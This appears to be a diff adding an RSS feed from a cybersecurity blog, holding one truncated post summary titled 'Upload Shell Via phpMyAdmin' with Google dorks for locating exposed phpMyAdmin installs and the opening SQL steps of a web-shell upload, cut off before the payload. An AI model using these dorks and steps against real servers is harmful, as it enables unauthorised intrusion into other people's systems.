@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>fileupload on ThikLab - CyberSec</title>
+    <link>https://thiklab.com/en/tags/fileupload/</link>
+    <description>Recent content in fileupload on ThikLab - CyberSec</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
+    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
+    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2019 - 2022 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
+    <lastBuildDate>Thu, 01 Apr 2021 10:01:06 +0700</lastBuildDate>
+    
+        <atom:link href="https://thiklab.com/en/tags/fileupload/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Upload Shell Via phpMyAdmin</title>
+        <link>https://thiklab.com/en/posts/upload-shell-via-phpmyadmin/</link>
+        <pubDate>Thu, 01 Apr 2021 10:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Thu, 01 Apr 2021 10:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/upload-shell-via-phpmyadmin/</guid>
+        <description>Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query Go to phpMyadmin database and create new database, ex: &amp;ldquo;uploader&amp;rdquo; and than select on SQL tap and paste this code below.
+1 2 3  CREATETABLE`uploader`.`userform`(`track1`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   And this code.
+1 2 3  CREATETABLE`uploader`.`user_upload`(`track2`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   Now select on table user_upload and SQL tap and paste this code below.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  insertintouserformvalues(&amp;#39;&amp;lt;!</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature3/sqli.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>fileupload</category>
+            
+          
+            
+              <category>googledork</category>
+            
+          
+        
+        
+          
+            
+              <category>SQLi</category>
+            
+          
+        
+        
+          
+            
+              <category>WebApp</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
